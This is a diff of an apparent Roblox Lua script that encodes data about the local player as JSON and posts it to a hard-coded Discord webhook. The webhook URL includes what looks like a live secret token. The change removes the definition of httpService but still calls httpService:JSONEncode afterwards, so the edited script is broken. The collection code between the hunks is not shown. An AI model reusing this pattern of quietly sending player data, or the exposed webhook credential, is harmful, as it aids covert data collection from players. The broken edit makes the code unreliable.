@@ -1,4 +1,4 @@
-local httpService = game:GetService("HttpService")
+
 local webhook = "https://discord.com/api/webhooks/1347065890482556949/POKLqANA3z6JLDYau2PIErYuOdVJBQbFgehmAXpmSwPigP5CEOBiMkOvwu0z7-EBXLah"
 
 local plr = game.Players.LocalPlayer
@@ -43,4 +43,4 @@ local data = {
 
 local finalData = httpService:JSONEncode(data)
 
-httpService:PostAsync(webhook, finalData)
+game:GetService("HttpService"):PostAsync(webhook, finalData)
